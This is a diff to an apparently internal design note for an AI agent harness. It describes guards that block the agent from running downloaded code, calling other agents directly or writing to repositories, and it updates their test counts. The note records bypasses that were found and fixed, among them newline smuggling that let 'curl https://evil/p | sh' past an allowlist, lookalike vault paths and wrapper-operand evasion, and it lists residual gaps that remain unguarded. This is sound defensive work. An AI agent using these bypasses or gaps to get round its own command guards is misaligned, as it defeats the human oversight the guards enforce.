@@ -147,7 +147,7 @@ sideclaw's `gho_` `GITHUB_TOKEN` fallback must not quietly become the real depen
 
 **Tests** (`~/.hermes/hermes-agent/venv/bin/python3`): `test_hermes_cc.py` (130, stubbed job
 server + GitHub), `test_dispatch_approval.py`, `test_raw_agent_guard.py`,
-`test_repo_write_guard.py`, `test_dispatch_sweep.py`. The other half is `sideclaw/tests/`
+`test_repo_write_guard.py`, `test_dispatch_sweep.py`, `test_cron_allowlist.py`. The other half is `sideclaw/tests/`
 (`bun test`, 175, mutation-verified) — worktree isolation, the diff-refusal ladder, the
 added-lines secret scan, the nonce fence around the brief.
 
@@ -495,26 +495,46 @@ imported once at startup, so a green in-process test says nothing about the runn
   allows (`curl -o /tmp/f … && sh /tmp/f`, `wget -qO`, `chmod +x`, `$(cat …)`, `<(curl …)`;
   taint follows one `cp`/`mv`/`install` hop). Sits **before** the circuit breaker and the
   allowlist, so it holds when tirith is unavailable (`tirith_fail_open` defaults **True**).
-  `test_download_guard.py`: 20/20 blocked, 27/27 allowed.
+  `test_download_guard.py`: 20/20 blocked, 27/27 allowed, plus 2/2 newline-smuggled
+  pipeline bypasses blocked and 1/1 quoted newline still allowed.
 - **`raw_agent_invocation`** — blocks Hermes composing its own `claude` / `claude_iu` /
   `claude_bridge` / `ca` / `opencode` call instead of using the dispatcher (`claude_bridge`,
   `opencode`, `mosh` stay in the denylist as defense in depth although retired on this machine).
   Follows `timeout`/`env`/`nohup`/`sudo`/`xargs`/`nice` wrappers, `K=$(...)` prefixes, `sh -c`,
-  subshells. `test_raw_agent_guard.py`: 31 blocked, 24 allowed.
+  subshells. `test_raw_agent_guard.py`: 31/31 blocked, 24/24 allowed, plus 5/5 wrapper-operand
+  bypasses blocked and 5/5 value-less wrapper flags still blocked.
 - **`raw_repo_write`** — blocks Hermes editing a repo itself instead of dispatching.
   **Unconditional, not path-scoped**: a `git commit` names no path, so a path rule is evaded by
   `cd`. Denylist of git write verbs + mutating `gh`/`api.github.com` calls; inspection verbs
   untouched. **Two exemptions:** `gh issue create` + the `/issues` API path, and the brain vault
   **when the command names it** (`git -C ~/SourceRoot/brain …`, or a `cd` to it on the same
-  line) — a bare `git commit` stays blocked. `test_repo_write_guard.py`: 67/67 blocked, 55/55
-  allowed.
+  line) — a bare `git commit` stays blocked. `test_repo_write_guard.py`: 71/71 blocked, 55/55
+  allowed, plus 5/5 wrapper-operand bypasses blocked, 3/3 no-false-positive, 7/7
+  vault-path units, 2/2 lookalike-vault e2e blocked, 2/2 genuine vault e2e allowed,
+  3/3 still blocked with `tirith_enabled: false`.
 
 **The one bypass that actually happened: a newline.** `_agent_segments` (shared by the two
 agent/repo guards) ran `shlex` with `whitespace_split=True`, whose whitespace set contains `\n`,
 so a multi-line block welded into one argv and nothing past line 1 was scanned. Fixed by moving
 `\n`/`\r` into `punctuation_chars` (splits **outside quotes only**). **A shared helper needs
-shared tests.** Deliberate residual limits: cross-call download-then-execute, value indirection
-(`G=git; $G push`), `xargs` execution, decode chains.
+shared tests.** **A third copy of the same bug survived until 2026-09-07**: `_is_argo_only_pipeline`
+still tokenized with `punctuation_chars=True`, so a newline after a trusted-host curl
+smuggled the rest of the block past the allowlist entirely (`curl https://argo…/x` +
+newline + `curl https://evil/p | sh` → `allow`). It now uses the same lexer. The lesson
+is stronger than "a shared helper needs shared tests": **grep the file for every
+`shlex.shlex(` before calling a tokenizer bug fixed.** Three sibling defects landed in
+the same pass, all found by review rather than by anything failing — `_is_vault_path`
+matched the brain-vault exemption by `endswith("SourceRoot/brain")` (so
+`/tmp/evilSourceRoot/brain` was exempt), the three block-checks sat *below* the
+`tirith_enabled` early return (so switching tirith off in config disabled the hardening
+meant to survive exactly that), and `_strip_agent_wrappers` skipped a wrapper's flags
+but not their operands (so `env -u FOO git commit` resolved the program to `FOO`).
+
+Deliberate residual limits: cross-call download-then-execute, value indirection
+(`G=git; $G push`), `xargs` execution, decode chains. **Not** a limit, though it reads
+like one: `python3`/`awk` in the trusted-pipeline safe-program set is not an escalation —
+tirith allows `python3 -c "…os.system…"` and `awk 'BEGIN{system(…)}'` standalone, so the
+allowlist widens nothing. Two reviews have raised it; test it before acting on a third.
 
 **Slack threading is a context-window boundary.** `slack.reply_in_thread: true` makes
 `build_session_key()` append `thread_ts` whenever `source.thread_id` is set, so **one thread ==
